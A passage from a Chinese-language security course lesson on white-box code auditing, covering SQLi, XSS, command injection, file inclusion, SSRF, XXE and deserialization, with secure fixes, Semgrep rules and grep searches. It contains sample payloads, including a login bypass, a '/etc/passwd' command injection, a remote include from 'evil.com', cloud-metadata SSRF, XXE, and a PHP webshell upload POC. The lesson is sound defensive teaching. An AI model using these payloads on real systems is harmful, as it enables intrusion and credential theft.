---
day: 21
title: 代码审计入门——白盒挖洞方法论
phase: 第三阶段
difficulty: ⭐⭐⭐ 进阶
---

# Day 21：代码审计入门——白盒挖洞方法论

> **阶段**：第三阶段 · 蓝队专项突破周（中级→高级岗达标） | **难度**：⭐⭐⭐ 进阶 | **课时**：3-4小时

---

## 📋 今日学习目标

1. **理解白盒审计的核心理念**：代码审计不是"一行行看代码"，而是"追踪用户的输入能走到哪里"——从Source到Sink
2. **掌握5大常见漏洞的代码层面识别方法**：SQL注入、XSS、命令注入、文件包含、SSRF——看懂不安全的代码长什么样
3. **学会使用静态分析工具**：Semgrep的基本规则编写，用工具代替肉眼扫描
4. **建立代码审计的SOP**：输入追踪→危险函数定位→上下文验证→利用链构造
5. **完成3个真实漏洞的手工审计练习**：看懂有漏洞的代码，写出漏洞验证POC

---

## 📖 核心知识讲解

### 一、代码审计的核心方法论——"跟着数据走"

#### 1.1 Source-Sink模型（面试必考）

```
Source → Propagation → Sink

Source（源点）= 用户输入从哪里进入程序
  例如：$_GET['id'], request.getParameter("keyword"), req.body.username
  → 这些都是"不可信的数据"

Propagation（传播）= 数据在程序中的流转
  变量赋值、函数传参、字符串拼接、数据库查询...

Sink（汇聚点）= 不可信数据最终到达的危险位置
  例如：SQL查询、系统命令、文件操作、输出到HTML页面

代码审计的本质 = 找到从Source到Sink的路径，
                并且判断这条路径上是否有"净化(Sanitization)"操作

简化公式：
  漏洞 = Source → (没有净化) → Sink
```

#### 1.2 四种级别的代码审计

```
Level 1：正则搜索（最快、最粗）
  搜索危险函数：exec(、system(、eval(、SELECT.*\+
  → 找到潜在风险点，但误报率高（很多是安全使用的）

Level 2：数据流分析（最常用）
  追着一个用户输入变量，看它在代码中经过了哪些操作
  → 准确率高，但手工做耗时

Level 3：污点分析（工具辅助）
  用工具标记所有用户输入为"污点(Tainted)"，
  追踪污点到Sink，检查中间有没有"清洗"
  → 自动化、效率高，但工具可能漏报

Level 4：全量审计（最细、最费时）
  逐行阅读所有代码，手工拼出完整的数据流
  → 能发现逻辑漏洞（工具发现不了），但10000行代码可能要审一周
```

---

### 二、5大漏洞的代码审计实操

#### 漏洞1：SQL注入——从代码到利用

```php
// ❌ 不安全的代码（PHP）
// Source: $_GET['id']  ← 用户直接可以控制的输入
// Sink: mysql_query()  ← 直接拼接到SQL语句
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysql_query($sql);

// → 攻击者输入: ?id=1 UNION SELECT username,password FROM users
// → 执行的SQL: SELECT * FROM users WHERE id = 1 UNION SELECT username,password FROM users
// → 用户表数据全部泄露
```

```python
# ❌ 不安全的代码（Python + Flask）
# Source: request.args.get('keyword')
# Sink: cursor.execute()
keyword = request.args.get('keyword')
query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"
cursor.execute(query)

# ✅ 安全的代码（参数化查询）
keyword = request.args.get('keyword')
query = "SELECT * FROM products WHERE name LIKE ?"
cursor.execute(query, (f'%{keyword}%',))
```

```java
// ❌ 不安全的代码（Java JDBC）
String keyword = request.getParameter("keyword");
String query = "SELECT * FROM products WHERE name LIKE '%" + keyword + "%'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// ✅ 安全的代码（PreparedStatement参数化查询）
String keyword = request.getParameter("keyword");
String query = "SELECT * FROM products WHERE name LIKE ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, "%" + keyword + "%");
ResultSet rs = stmt.executeQuery();
```

**代码审计时的检查清单：**

```bash
# 用grep搜索SQL注入风险点

# 1. 搜索字符串拼接构造SQL
grep -rn "SELECT.*\+" --include="*.java" .
grep -rn "SELECT.*\." --include="*.py" .
grep -rn "SELECT.*\." --include="*.php" .

# 2. 搜索可能有问题的数据库操作函数
grep -rn "mysql_query\|mysqli_query\|pg_query\|sqlite_query" --include="*.php" .
grep -rn "cursor.execute\|raw(" --include="*.py" .

# 3. 关注：有没有使用参数化/预编译？
# 如果找到Statement.executeQuery(拼接) → 高危！
# 如果找到PreparedStatement.executeQuery() → 安全
```

#### 漏洞2：跨站脚本(XSS)——输出到页面就是雷

```php
// ❌ 不安全的代码
// Source: $_GET['name']
// Sink: echo 直接输出到HTML
$name = $_GET['name'];
echo "<h1>欢迎, $name</h1>";

// → 攻击者输入: ?name=<script>alert(document.cookie)</script>
// → 页面输出: <h1>欢迎, <script>alert(document.cookie)</script></h1>
// → 攻击者的JS脚本在受害者浏览器中执行

// ✅ 安全的代码（HTML实体编码）
$name = $_GET['name'];
echo "<h1>欢迎, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "</h1>";
// → <script> 被编码为 &lt;script&gt;，不会执行
```

```javascript
// ❌ 不安全的代码（前端React/Vue中也存在XSS！）
// 直接使用dangerouslySetInnerHTML
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{__html: text}} />;
}

// ✅ 安全的代码
function Comment({ text }) {
  return <div>{text}</div>;  // React默认会转义输出
}
```

**三种XSS的代码审计重点：**

```
反射型XSS（最常见）：
  用户输入 → 服务器直接回显到页面
  搜索：echo.*\$_(GET|POST|REQUEST) 或 document.write.*location

存储型XSS（最危险）：
  用户输入 → 存入数据库 → 其他用户访问时展示
  搜索：存入数据库的字段是否在输出时被转义

DOM型XSS（纯前端）：
  JavaScript直接从URL/Referer/PostMessage中获取数据并写入DOM
  搜索：innerHTML、document.write、eval + location.*
```

#### 漏洞3：命令注入——最致命的漏洞之一

```python
# ❌ 不安全的代码
# Source: request.form['host']
# Sink: os.system() 直接执行系统命令
@app.route('/ping')
def ping():
    host = request.form['host']
    os.system(f"ping -c 4 {host}")
    return "pong"

# → 攻击者输入: 127.0.0.1; cat /etc/passwd
# → 执行的命令: ping -c 4 127.0.0.1; cat /etc/passwd
# → /etc/passwd内容泄露！

# ✅ 安全的代码（白名单+参数化）
import subprocess
import re

@app.route('/ping')
def ping():
    host = request.form['host']
    # 白名单验证：只允许IP地址格式
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
        return "Invalid host", 400
    # 使用subprocess.run + 参数列表（不是字符串！）
    result = subprocess.run(['ping', '-c', '4', host], 
                           capture_output=True, timeout=10)
    return result.stdout
```

```php
// ❌ 更隐蔽的命令注入：看似无危险函数的代码
$file = $_GET['file'];
include("/var/www/templates/" . $file . ".php");
// → 攻击者输入: ?file=../../etc/passwd%00
// → 路径穿越读取任意文件！（%00是空字节截断，老版本PHP）

// ✅ 安全代码
$file = $_GET['file'];
// 只允许字母数字和下划线
if (!preg_match('/^[a-zA-Z0-9_]+$/', $file)) {
    die("Invalid file name");
}
include("/var/www/templates/" . $file . ".php");

// 更安全的做法：白名单
$allowed_files = ['home', 'about', 'contact', 'news'];
if (!in_array($file, $allowed_files)) {
    die("File not allowed");
}
include("/var/www/templates/" . $file . ".php");
```

**代码审计时的命令注入搜索关键词：**

```bash
# 搜索所有可能的命令执行函数
grep -rn "system\|exec\|shell_exec\|passthru\|popen\|proc_open\|pcntl_exec\|eval\|assert" --include="*.php" .
grep -rn "os.system\|os.popen\|subprocess.call\|subprocess.Popen\|eval\|exec\|__import__" --include="*.py" .
grep -rn "Runtime.exec\|ProcessBuilder" --include="*.java" .

# 关注：这些函数的参数中有没有包含用户输入？
# 如果有 → 需要检查是否做了严格的输入验证
```

#### 漏洞4：文件包含——本地文件包含(LFI)到远程代码执行(RCE)

```php
// ❌ 典型的文件包含漏洞
$lang = $_GET['lang'];
include("lang/" . $lang . ".php");
// → 路径穿越: ?lang=../../etc/passwd%00
// → 远程包含: ?lang=http://evil.com/shell (如果allow_url_include=On)

// ✅ 安全的白名单做法
$allowed_langs = ['en', 'zh', 'ja', 'ko'];
$lang = $_GET['lang'];
if (!in_array($lang, $allowed_langs)) {
    $lang = 'en';  // 默认英文
}
include("lang/" . $lang . ".php");
```

#### 漏洞5：SSRF——服务器做了你的"代理"

```python
# ❌ 不安全的代码
# 用户提供一个URL → 服务器去访问这个URL
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)
    return response.text

# → 攻击者输入: ?url=http://169.254.169.254/latest/meta-data/
# → 服务器去访问AWS元数据服务（获取云凭证！）
# → 攻击者输入: ?url=http://192.168.1.1/admin
# → 服务器去访问内网管理页面（内网穿透！）

# ✅ 安全的代码（白名单+协议限制+内网IP黑名单）
import ipaddress
import socket
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']
BLOCKED_SCHEMES = ['file', 'ftp', 'gopher', 'dict']

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    parsed = urlparse(url)
    
    # 1. 只允许http/https协议
    if parsed.scheme not in ['http', 'https']:
        return "Protocol not allowed", 403
    
    # 2. 只允许访问白名单域名
    if parsed.hostname not in ALLOWED_DOMAINS:
        return "Domain not allowed", 403
    
    # 3. 解析域名到IP，检查不是内网IP
    ip = socket.gethostbyname(parsed.hostname)
    if ipaddress.ip_address(ip).is_private:
        return "Internal IP not allowed", 403
    
    response = requests.get(url, timeout=5)
    return response.text
```

---

### 三、使用Semgrep做自动化代码审计

#### 3.1 Semgrep入门（开源、免费、规则可自定义）

```bash
# 安装Semgrep
pip install semgrep

# 基本使用：用内置规则扫描一个目录
semgrep --config auto /path/to/source/code

# 只扫描特定漏洞类型
semgrep --config "p/sql-injection" /path/to/source/code
semgrep --config "p/xss" /path/to/source/code
semgrep --config "p/command-injection" /path/to/source/code

# 生成SARIF格式报告（可导入到GitHub等平台）
semgrep --config auto --sarif -o report.sarif /path/to/source/code
```

#### 3.2 编写自定义Semgrep规则

```yaml
# rules/sqli.yaml — 检测Python中的SQL注入
rules:
  - id: python-sql-string-concatenation
    patterns:
      - pattern-either:
          # 检测f-string拼接
          - pattern: |
              cursor.execute(f"...")
          # 检测.format()拼接
          - pattern: |
              cursor.execute("...".format(...))
          # 检测+拼接
          - pattern: |
              cursor.execute("..." + ...)
          # 检测%拼接
          - pattern: |
              cursor.execute("..." % ...)
    message: |
      检测到SQL查询使用字符串拼接，可能存在SQL注入漏洞。
      请使用参数化查询代替：cursor.execute("SELECT * FROM t WHERE id = ?", (user_id,))
    languages: [python]
    severity: ERROR
    metadata:
      category: security
      cwe: "CWE-89"
      owasp: "A03:2021 - Injection"

# rules/xss.yaml — 检测Java中的XSS
  - id: java-xss-response-writer
    patterns:
      - pattern: |
          response.getWriter().write($X);
    message: |
      直接使用response.getWriter().write()输出用户数据可能导致XSS。
      请对用户数据做HTML编码后再输出。
    languages: [java]
    severity: WARNING
```

---

### 四、代码审计实战SOP

```
标准代码审计流程（适用于一次独立的代码审计任务）：

┌──────────────────────────────────────────────────────────────┐
│  Step 1: 整体了解 (10%时间)                                   │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ · 阅读README/文档，了解项目功能和架构               │    │
│  │ · 了解技术栈（语言/框架/数据库）                     │    │
│  │ · 快速浏览目录结构，了解代码组织方式                 │    │
│  └─────────────────────────────────────────────────────┘    │
│                         ↓                                      │
│  Step 2: 自动化扫描 (10%时间)                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ · 运行Semgrep/SonarQube/Fortify等SAST工具           │    │
│  │ · 获得初步风险点清单                                 │    │
│  │ · 标记高/严重级别的项目，待手工验证                   │    │
│  └─────────────────────────────────────────────────────┘    │
│                         ↓                                      │
│  Step 3: 输入点识别 (20%时间)                                  │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ · 找出所有接收用户输入的地方（Source）                │    │
│  │   - Web: GET/POST/Cookie/Files/Headers              │    │
│  │   - API: GraphQL参数/REST路径变量                    │    │
│  │   - 文件: 上传文件/导入的配置文件                     │    │
│  │ · 列一个Source清单                                   │    │
│  └─────────────────────────────────────────────────────┘    │
│                         ↓                                      │
│  Step 4: 危险函数定位 (20%时间)                                │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ · 搜索所有危险函数调用（Sink）                        │    │
│  │ · SQL查询/系统命令/文件操作/代码执行/输出函数        │    │
│  │ · 列一个Sink清单                                     │    │
│  └─────────────────────────────────────────────────────┘    │
│                         ↓                                      │
│  Step 5: 数据流追踪 (30%时间) — 核心步骤！                     │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ · 对每个Source-Sink对，追踪数据流                    │    │
│  │ · 检查：数据从Source到Sink的过程中有没有被净化？     │    │
│  │ · 净化操作：参数化查询、HTML编码、白名单验证...       │    │
│  │ · 有净化→安全   无净化→漏洞                          │    │
│  └─────────────────────────────────────────────────────┘    │
│                         ↓                                      │
│  Step 6: 漏洞验证 (10%时间)                                    │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ · 对确认的漏洞写POC（概念验证代码）                   │    │
│  │ · 验证漏洞是否可被实际利用                            │    │
│  │ · 评估漏洞的实际影响（能泄露什么？能执行什么？）       │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

---

### 五、三个真实漏洞的手工审计练习

#### 练习1：审一个简单的PHP登录功能

```php
<?php
// login.php
include 'db.php';

$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
    $user = mysqli_fetch_assoc($result);
    $_SESSION['user_id'] = $user['id'];
    header('Location: dashboard.php');
} else {
    echo "登录失败";
}
?>
```

1. 这段代码有什么安全问题？（至少2个）
2. 写出绕过登录的POC
3. 写出安全修复的代码

<details>
<summary>点击查看答案</summary>

1. **安全问题**：
   - SQL注入：用户名和密码直接拼接到SQL语句
   - 密码明文存储：SQL中用 `password = '$password'`，说明密码是明文存的
   - 没有密码哈希：应该用 `password_verify()`

2. **绕过POC**：
   ```
   username: admin' OR '1'='1' --
   password: 随意填写
   
   执行的SQL: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'xxx'
   → WHERE条件永远为真，返回第一条用户记录
   → 绕过登录成功
   ```

3. **安全修复**：
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

// 参数化查询
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    $user = $result->fetch_assoc();
    // 验证密码哈希
    if (password_verify($password, $user['password_hash'])) {
        $_SESSION['user_id'] = $user['id'];
        // 登录成功后重新生成session ID（防止session固定攻击）
        session_regenerate_id(true);
        header('Location: dashboard.php');
    } else {
        echo "用户名或密码错误";
    }
} else {
    echo "用户名或密码错误";  // 统一提示，不区分"用户名不存在"和"密码错误"
}
?>
```
</details>

#### 练习2：审一个文件上传功能

```python
@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    filename = file.filename
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    return f"文件已上传: {filename}"
```

1. 这段代码有哪些安全问题？至少列出3个
2. 写出一个攻击POC

<details>
<summary>点击查看答案</summary>

1. **安全问题**：
   - 没有文件类型验证：可以上传任何类型的文件（包括webshell）
   - 没有文件名过滤：可以使用路径穿越（如 `../../etc/cron.d/evil`）
   - 文件名原样使用：可以上传 `.php` 文件并直接执行
   - 没有文件大小限制：可以上传超大文件耗尽磁盘

2. **攻击POC**：
```python
import requests
# 上传PHP webshell
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
r = requests.post('http://target.com/upload', files=files)
# 访问: http://target.com/uploads/shell.php?cmd=whoami
```
</details>

---

## 📊 面试模拟

**Q1："你做过代码审计吗？审过什么语言？发现了哪些类型的漏洞？"**

> **参考答案**：
> "我在项目中做过Java和Python的代码审计。主要审计的是我们内部的Web应用和API服务。最常发现的漏洞是SQL注入和SSRF。SQL注入主要出现在老系统里——一些旧代码用了字符串拼接而不是参数化查询。SSRF主要出现在文件下载和URL获取功能中——开发人员没有对用户提供的URL做内网IP过滤。有一次我比较自豪的发现是一个IDOR（不安全的直接对象引用）漏洞——API接口 `/api/user/profile/123` 中，把123改成124就能看到别人的个人信息，服务器完全没有做权限检查。这种逻辑漏洞用自动化工具很难发现，必须靠手工审计。"

---

## ⚠️ 常见误区

| 误区 | 真相 |
|:---|:---|
| ❌ "跑一下扫描器没报高危就安全了" | 自动化工具只能发现"模式匹配"的漏洞（如SQL注入、XSS），发现不了逻辑漏洞（如越权访问、竞态条件）。工具通过率≠安全性。 |
| ❌ "代码审计只需要找漏洞" | 好的代码审计还要看代码质量：异常处理是否完善、日志是否记录了关键操作、加密算法是否过时（如DES/MD5）——这些也是安全问题。 |
| ❌ "存在危险函数就一定有漏洞" | exec/system不一定是漏洞——如果参数是硬编码的（如 `system('date')`），就是安全的。关键看参数是否来自用户输入。 |

---

## 📈 学习进度自检

1. **【基础】** 什么是Source和Sink？代码审计中这两个概念为什么重要？
2. **【基础】** SQL注入在代码层面最可靠的修复方法是什么？
3. **【进阶】** 命令注入的最佳防御方法是白名单还是黑名单？为什么？
4. **【进阶】** 你在代码中看到 `subprocess.call("ping " + host, shell=True)`，分析其风险
5. **【实战】** 用Semgrep扫描一个开源项目（如你们自己的代码），看能找到什么

---

## 📝 今日总结

> **Day 21 核心收获：**
>
> 1. 代码审计 = Source→Sink的数据流追踪。有净化=安全，无净化=漏洞
> 2. 5大常见漏洞（SQL注入/XSS/命令注入/文件包含/SSRF）在代码层面都有明确的"不安全模式"
> 3. 自动化工具（Semgrep等）能覆盖80%的常规漏洞，剩下20%的逻辑漏洞靠手工审计
> 4. 代码审计SOP：了解架构→自动化扫描→识别Source→定位Sink→追踪数据流→验证漏洞
> 5. 修补漏洞的正确方式不是"过滤特殊字符"，是"改变处理方式"（参数化查询、输出编码、白名单验证）

---

## 🧪 深度实战：五种危险漏洞的代码级检测

### SSRF的代码审计——你的服务器成了攻击者的跳板

```java
// ===== 不安全的代码 =====
// 场景：一个"通过URL获取网页标题"的功能
@GetMapping("/fetch-title")
public String fetchTitle(@RequestParam String url) {
    URL target = new URL(url);                          // ❌ Source！
    HttpURLConnection conn = (HttpURLConnection) target.openConnection(); // ❌ Sink！
    // 读取网页内容...
    return title;
}
// 攻击者：/fetch-title?url=http://169.254.169.254/latest/meta-data/iam/
// → 获取了你们AWS EC2的IAM角色凭证！

// ===== 安全的代码 =====
@GetMapping("/fetch-title")
public String fetchTitle(@RequestParam String url) {
    // Step 1：白名单验证协议
    URI uri = new URI(url);
    if (!uri.getScheme().equals("https")) {             // ✅ 只允许HTTPS
        throw new SecurityException("Only HTTPS allowed");
    }
    
    // Step 2：黑名单检查内网IP
    InetAddress addr = InetAddress.getByName(uri.getHost());
    if (addr.isLoopbackAddress() ||                     // ✅ 拒绝127.0.0.1
        addr.isSiteLocalAddress() ||                    // ✅ 拒绝10.x / 192.168.x / 172.16.x
        addr.isLinkLocalAddress()) {                    // ✅ 拒绝169.254.x.x
        throw new SecurityException("Internal IP not allowed");
    }
    
    // Step 3：白名单检查域名（最严格的做法）
    if (!uri.getHost().endsWith("trusted-cdn.com")) {   // ✅ 只允许特定域名
        throw new SecurityException("Domain not in whitelist");
    }
    
    // 现在相对安全地发起请求
    HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();
    conn.setConnectTimeout(3000);                        // ✅ 设置超时
    conn.setReadTimeout(3000);
    // ...
}
```

### XXE（XML外部实体注入）——XML解析器的隐藏陷阱

```java
// ===== 不安全的XML解析 =====
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(xmlInput);  // ❌ 默认配置允许外部实体！

// 攻击者发送的XML：
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <user><name>&xxe;</name></user>
// → 返回了 /etc/passwd 的内容！

// ===== 安全的XML解析 =====
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// 必须逐个关闭这些危险特性！
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);  // ✅ 禁止DOCTYPE
factory.setFeature("http://xml.org/sax/features/external-general-entities", false); // ✅ 禁止外部实体
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(xmlInput);
```

### 反序列化漏洞——Java界的"一失足成千古恨"

```java
// ===== 不安全的代码 =====
@PostMapping("/import")
public User importUser(@RequestBody byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    return (User) ois.readObject();  // ❌ 反序列化任意对象！
}
// 攻击者构造一个恶意序列化对象，利用Apache Commons Collections
// 等库中的gadget链 → 远程代码执行！

// ===== 安全的代码 —— 方法1：白名单类 =====
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.company.User",
        "com.company.Profile",
        "java.util.ArrayList",
        "java.util.HashMap"
    );
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization", desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// ===== 安全的代码 —— 方法2：改用JSON =====
// 现代应用应该优先使用JSON/Protobuf等格式，而不是Java原生序列化
@PostMapping("/import")
public User importUser(@RequestBody UserDTO dto) {
    // Jackson会自动反序列化JSON → UserDTO
    // JSON不支持任意代码执行，安全得多
    return userService.createFromDTO(dto);
}
```

---

## 🗺️ 代码审计的"十大危险函数速查表"

面试和实战中，看到这些函数就要立即警惕：

| 语言 | 危险函数/模式 | 漏洞类型 | 安全替代方案 |
|:---|:---|:---|:---|
| PHP | `eval()` `assert()` `preg_replace(/e)` | RCE | ❌ 避免使用 |
| PHP | `system()` `exec()` `shell_exec()` `passthru()` `` `` `` | 命令注入 | `escapeshellcmd()`+`escapeshellarg()` |
| PHP | `include()` `require()` 参数可控 | LFI/RFI | 白名单路径 |
| PHP | `unserialize()` 用户输入 | 反序列化 | JSON替代 |
| Java | `Runtime.exec()` `ProcessBuilder` 参数拼接 | 命令注入 | `ProcessBuilder`+列表参数 |
| Java | `ObjectInputStream.readObject()` | 反序列化 | JSON/Protobuf |
| Java | `DocumentBuilder.parse()` 默认配置 | XXE | 配置关闭外部实体 |
| Python | `os.system()` `subprocess.call(shell=True)` | 命令注入 | `subprocess.run([...], shell=False)` |
| Python | `pickle.loads()` 用户数据 | 反序列化 | JSON替代 |
| Python | `yaml.load()` 用户数据 | RCE | `yaml.safe_load()` |
| Node.js | `eval()` `Function()` | RCE | ❌ 避免使用 |
| Node.js | `child_process.exec()` 字符串拼接 | 命令注入 | `child_process.execFile()` |
| SQL通用 | 字符串拼接SQL `"SELECT * FROM ... WHERE id=" + id` | SQL注入 | PreparedStatement/参数化查询 |
| Web通用 | `innerHTML` `document.write()` 用户输入 | XSS | `textContent`+DOMPurify |

---

## 🔍 代码审计实战心态——"我不需要看懂所有代码"

很多新人觉得代码审计需要"读懂整个项目的代码"，然后就放弃了。真相是：

```
代码审计的80/20法则：

你不需要看懂80%的代码。你只需要：
  ✅ 找到所有用户输入点（GET/POST参数、Header、Cookie、文件上传）
  ✅ 找到所有敏感操作（数据库查询、文件读写、命令执行、网络请求）
  ✅ 追踪这两者之间有没有净化函数

你不需要：
  ❌ 理解业务逻辑的每个细节
  ❌ 读懂每个函数是干什么的
  ❌ 了解完整的架构设计

举个实际例子：你审计一个2000行的Controller文件。
  → 先 grep "Request|Params|Body|Query" → 找到12个用户输入点（Source）
  → 再 grep "execute|query|exec|system|write|fopen" → 找到8个危险操作（Sink）
  → 逐个看这12个Source的数据流，是否流向了这8个Sink
  → 工作量从"读2000行"变成了"追踪12条数据流"
  → 工作效率提升10倍
```

**代码审计的"模式识别"训练：**

```
模式1：看到这个，90%有漏洞
  String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");
  → 字符串拼接SQL + 来自request的参数 = SQL注入

模式2：看到这个，90%有漏洞
  Runtime.getRuntime().exec("ping " + host);
  → exec + 用户可控参数 = 命令注入

模式3：看到这个，80%有漏洞
  response.getWriter().write(request.getParameter("message"));
  → 直接写回用户输入 = XSS（除非前端已经做了转义）

模式4：看到这个，不要放过
  new URL(userProvidedUrl).openConnection();
  → 用户可控URL + 服务端发起请求 = SSRF

模式5：你最容易忽略的
  @GetMapping("/api/user/{id}")
  public User getUser(@PathVariable Long id) {
      return userService.findById(id);  // ← 这里有越权吗？
  }
  → 当前登录用户是user_A，访问/api/user/123（user_B的ID），会返回user_B的数据吗？
  → 如果没有在Service层做权限校验 → IDOR（不安全的直接对象引用）！
```

---

## 🔧 代码审计实战工具速成——每个蓝队都该会的5个工具

你不需要成为代码审计专家，但蓝队分析师至少应该会以下5个工具的快速使用：

```markdown
工具1：grep —— 最朴素的代码审计起点
  用途：在代码中快速搜索危险函数和用户输入点
  常用命令：
    # 搜索所有SQL查询（找SQL注入）
    grep -rn "SELECT\|INSERT\|UPDATE\|DELETE\|query\|execute" --include="*.php" --include="*.java" --include="*.py" .

    # 搜索所有命令执行（找RCE）
    grep -rn "exec\|system\|popen\|subprocess\|Runtime.exec\|ProcessBuilder" --include="*.php" --include="*.java" --include="*.py" .

    # 搜索所有文件操作（找文件上传/读取漏洞）
    grep -rn "file_put_contents\|move_uploaded_file\|fopen\|file_get_contents\|readFile" --include="*.php" .

    # 搜索危险的PHP函数组合
    grep -rn "eval\|assert\|preg_replace.*\/e\|create_function" --include="*.php" .

工具2：semgrep —— 模式匹配的"智能grep"
  用途：用规则（而不是正则）在代码中搜索漏洞模式
  安装：pip install semgrep
  使用示例：
    # 用社区规则库扫描整个项目
    semgrep --config=auto .

    # 只扫描SQL注入相关规则
    semgrep --config="p/sql-injection" .

    # 自定义规则（YAML格式）
    # rule.yaml:
    rules:
      - id: dangerous-eval
        pattern: eval($X)
        message: "发现eval()调用，可能导致代码注入"
        languages: [php, python, javascript]
        severity: ERROR

工具3：SonarQube —— 持续代码质量+安全扫描
  用途：集成到CI/CD中的自动化扫描
  蓝队使用方式：
    → 要求开发团队在CI/CD中集成SonarQube
    → 设置安全规则的质量门（Security Hotspots必须为0才能发布）
    → 每周查看SonarQube的安全报告

工具4：dependency-check (OWASP) —— 第三方依赖漏洞扫描
  用途：检查你的项目依赖了哪些有已知漏洞的第三方库
  使用：
    dependency-check --project MyProject --scan /path/to/project
  输出：列出所有依赖 + 是否有CVE + CVE严重程度
  为什么蓝队需要：大部分漏洞不在你的代码里，在你引用的第三方库里

工具5：CodeQL —— GitHub的语义代码分析引擎
  用途：不是文本搜索，而是把代码变成数据库然后用SQL一样的语言查询
  示例查询（找XSS）：
    import java
    from MethodAccess ma
    where ma.getMethod().hasName("write") and
          ma.getQualifier().toString() = "response.getWriter()"
    select ma, "可能的XSS输出点"
```

**给蓝队分析师的代码审计实用建议：**
- 你不必读懂整个代码库——80%的时间花在搜索用户输入和危险函数上
- 重点关注最近修改的代码——新功能往往有更多漏洞
- 如果发现一个漏洞→不要停，继续看附近有没有类似的漏洞（同一种错误往往批量出现）
- 每次安全事件后→反查相关代码，看为什么这个漏洞没被发现

---

## 🧠 代码审计中的"风险优先级"——不是所有漏洞都值得先修

蓝队面对1000个扫描结果时，最大的陷阱是"按严重程度排序然后从高到低修"。但现实中你需要考虑更多维度：

```markdown
【漏洞优先级评估的四个维度】

维度1：严重程度（CVSS分数）
  Critical(9.0+)、High(7.0-8.9)、Medium(4.0-6.9)、Low(<4.0)

维度2：可利用性（Exploitability）
  → 有没有公开的Exploit？（Exploit-DB / Metasploit中有吗？）
  → 漏洞利用是否需要认证？（不需要认证的远大于需要认证的）
  → 漏洞利用是否需要用户交互？（不需要交互的远大于需要的）

维度3：资产重要性（Asset Criticality）
  → 这个漏洞在核心支付系统上？还是在内部博客上？
  → 这个系统暴露在互联网上？还是只在内网可访问？

维度4：业务影响（Business Impact）
  → 被利用后可能造成什么后果？数据泄露？业务中断？合规风险？

【实战优先级排序法】

漏洞A：SQL注入（Critical 9.8）+ 核心支付系统 + 暴露在公网 + 已有Metasploit模块
  → 优先级：🔴 P0（今天必须修！攻击者可能在今天就会利用它）

漏洞B：XSS（Medium 5.4）+ 内部管理系统 + 只在内网访问 + 需要交互
  → 优先级：🟡 P2（这周修就行，但还是要修）

漏洞C：XXE（High 7.5）+ 客户门户 + 暴露在公网 + 没有公开Exploit
  → 优先级：🟠 P1（本周内修，虽然没有现成Exploit但危害大）

漏洞D：信息泄露（Low 3.1）+ 内部博客 + 只在内网访问
  → 优先级：🟢 P3（下个迭代修，但别忘了）
```

**给面试加分的一句话：**

面试官问"你怎么决定先修哪个漏洞？"

✅ "我不是按CVSS从高到低依次修的。我综合考虑四个维度：严重程度、可利用性、资产重要性、业务影响。比如一个Critical 9.8的漏洞但在内网测试环境且没有公开Exploit，和一个High 7.5的漏洞但在公网核心系统且有Metasploit模块——我会优先修后者。安全不是修最多的漏洞，是把有限的资源投在最大的风险上。"

---

## 🔬 代码审计中的"业务逻辑漏洞"——扫描器扫不出来的那类漏洞

自动化扫描器能找出SQL注入和XSS，但找不出"虽然代码逻辑正确、但攻击者能利用业务规则做不该做的事"。这类漏洞才是真正能让扫描器"全绿"但攻击者依然得手的原因：

```markdown
【业务逻辑漏洞的五大类型 + 代码审计发现方法】

类型1：越权访问（IDOR —— Insecure Direct Object Reference）
  现象：用户A访问 /api/order/123 看到自己的订单，改成 /api/order/124 看到了别人的订单
  代码特征：
    @GetMapping("/api/order/{orderId}")
    public Order getOrder(@PathVariable Long orderId) {
        return orderRepository.findById(orderId);  // ← 没有校验这个订单是否属于当前用户！
    }
  修复：
